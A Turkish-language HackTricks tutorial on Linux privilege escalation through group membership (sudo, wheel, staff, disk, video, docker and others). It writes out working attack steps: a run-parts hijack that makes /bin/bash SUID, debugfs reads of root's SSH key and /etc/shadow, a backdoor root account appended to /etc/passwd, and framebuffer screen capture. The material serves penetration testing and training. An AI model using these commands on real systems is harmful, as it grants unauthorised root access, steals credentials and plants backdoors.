# İlginç Gruplar - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Yönetici Grupları

### **PE - Yöntem 1**

**Bazen**, **varsayılan olarak (veya bazı yazılımlar bunu gerektirdiği için)** **/etc/sudoers** dosyası içinde bu satırlardan bazılarını bulabilirsiniz:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu, **sudo veya admin grubuna ait olan herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.

Eğer durum böyleyse, **root olmak için sadece şunu çalıştırabilirsiniz**:
```
sudo su
```
### PE - Yöntem 2

Tüm suid ikili dosyalarını bulun ve **Pkexec** ikili dosyasının olup olmadığını kontrol edin:
```bash
find / -perm -4000 2>/dev/null
```
Eğer **pkexec** ikilisinin **SUID ikilisi** olduğunu ve **sudo** veya **admin** grubuna ait olduğunuzu bulursanız, muhtemelen `pkexec` kullanarak ikilileri sudo olarak çalıştırabilirsiniz.\
Bu, genellikle bu grupların **polkit politikası** içinde yer alması nedeniyledir. Bu politika, temelde hangi grupların `pkexec` kullanabileceğini belirler. Bunu kontrol etmek için:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Orada **pkexec** komutunu çalıştırmaya izin verilen grupları bulacaksınız ve bazı Linux dağıtımlarında **sudo** ve **admin** grupları **varsayılan olarak** görünmektedir.

**root olmak için şunu çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Eğer **pkexec** komutunu çalıştırmaya çalışırsanız ve bu **hata** ile karşılaşırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**İzinlerinizin olmaması nedeniyle değil, bir GUI olmadan bağlı olmadığınız için**. Bu sorun için bir çözüm burada: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumuna** ihtiyacınız var:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Grubu

**Bazen**, **varsayılan olarak** **/etc/sudoers** dosyası içinde bu satırı bulabilirsiniz:
```
%wheel	ALL=(ALL:ALL) ALL
```
Bu, **wheel grubuna ait olan herhangi bir kullanıcının sudo olarak her şeyi çalıştırabileceği** anlamına gelir.

Eğer durum böyleyse, **root olmak için sadece şunu çalıştırabilirsiniz**:
```
sudo su
```
## Shadow Grubu

**shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

## Personel Grubu

**staff**: Kullanıcıların root ayrıcalıklarına ihtiyaç duymadan sisteme yerel değişiklikler eklemelerine olanak tanır (`/usr/local`) (not: `/usr/local/bin` içindeki çalıştırılabilir dosyalar, herhangi bir kullanıcının PATH değişkenindedir ve aynı isimdeki `/bin` ve `/usr/bin` içindeki çalıştırılabilir dosyaların "üstüne yazabilir"). "adm" grubu ile karşılaştırın, bu grup daha çok izleme/güvenlik ile ilgilidir. [\[source\]](https://wiki.debian.org/SystemGroups)

Debian dağıtımlarında, `$PATH` değişkeni `/usr/local/`'un en yüksek öncelikle çalıştırılacağını gösterir, ayrıcalıklı bir kullanıcı olup olmadığınız önemli değildir.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Eğer `/usr/local` içindeki bazı programları ele geçirebilirsek, root erişimi elde etmek kolaydır.

`run-parts` programını ele geçirmek, root erişimi elde etmenin kolay bir yoludur, çünkü çoğu program `run-parts` gibi çalışır (crontab, ssh ile giriş yapıldığında).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
veya Yeni bir ssh oturumu açıldığında.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Sömürü**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Bu ayrıcalık neredeyse **root erişimi ile eşdeğerdir** çünkü makinenin içindeki tüm verilere erişebilirsiniz.

Dosyalar:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Not edin ki debugfs kullanarak **dosya yazabilirsiniz**. Örneğin, `/tmp/asd1.txt` dosyasını `/tmp/asd2.txt` dosyasına kopyalamak için şunu yapabilirsiniz:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ancak, **root tarafından sahip olunan dosyaları yazmaya** çalışırsanız (örneğin `/etc/shadow` veya `/etc/passwd`), "**İzin reddedildi**" hatası alırsınız.

## Video Grubu

`w` komutunu kullanarak **sistemde kimin oturum açtığını** bulabilirsiniz ve aşağıdaki gibi bir çıktı gösterecektir:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**, kullanıcının **yossi'nin makinedeki bir terminale fiziksel olarak giriş yaptığını** gösterir.

**video grubu**, ekran çıktısını görüntüleme erişimine sahiptir. Temelde ekranları gözlemleyebilirsiniz. Bunu yapmak için, ekranın üzerindeki **mevcut görüntüyü ham veri olarak yakalamanız** ve ekranın kullandığı çözünürlüğü almanız gerekir. Ekran verileri `/dev/fb0`'da kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size`'da bulabilirsiniz.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**Ham görüntüyü açmak için** **GIMP**'i kullanabilir, **`screen.raw`** dosyasını seçebilir ve dosya türü olarak **Ham görüntü verisi**'ni seçebilirsiniz:

![](<../../../images/image (463).png>)

Ardından, Genişlik ve Yükseklik değerlerini ekranda kullanılanlarla değiştirin ve farklı Görüntü Türlerini kontrol edin (ve ekranı daha iyi göstereni seçin):

![](<../../../images/image (317).png>)

## Root Grubu

Görünüşe göre varsayılan olarak **root grubunun üyeleri**, bazı **hizmet** yapılandırma dosyalarını veya bazı **kütüphane** dosyalarını veya ayrıcalıkları artırmak için kullanılabilecek **diğer ilginç şeyleri** **değiştirme** erişimine sahip olabilir...

**Root üyelerinin hangi dosyaları değiştirebileceğini kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Grubu

**Ana makinenin kök dosya sistemini bir örneğin hacmine bağlayabilirsiniz**, böylece örnek başladığında hemen o hacme `chroot` yükler. Bu, makinede size kök erişimi sağlar.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Son olarak, eğer daha önceki önerilerden hiçbiri hoşunuza gitmiyorsa veya bir sebepten dolayı çalışmıyorsa (docker api firewall?) her zaman **yetkili bir konteyner çalıştırmayı ve ondan kaçmayı** deneyebilirsiniz, burada açıklandığı gibi:

{{#ref}}
../docker-security/
{{#endref}}

Eğer docker soketi üzerinde yazma izinleriniz varsa [**docker soketini kötüye kullanarak nasıl yetki yükselteceğinizi anlatan bu yazıyı**](../index.html#writable-docker-socket)** okuyun.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Grubu

{{#ref}}
./
{{#endref}}

## Adm Grubu

Genellikle **`adm`** grubunun **üyeleri** _/var/log/_ dizininde bulunan **log** dosyalarını **okuma** izinlerine sahiptir.\
Bu nedenle, eğer bu grupta bir kullanıcıyı ele geçirdiyseniz, kesinlikle **loglara göz atmalısınız**.

## Auth grubu

OpenBSD içinde **auth** grubu genellikle _**/etc/skey**_ ve _**/var/db/yubikey**_ dizinlerinde yazma iznine sahiptir, eğer kullanılıyorsa.\
Bu izinler, root'a **yetki yükseltmek** için aşağıdaki istismar ile kötüye kullanılabilir: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
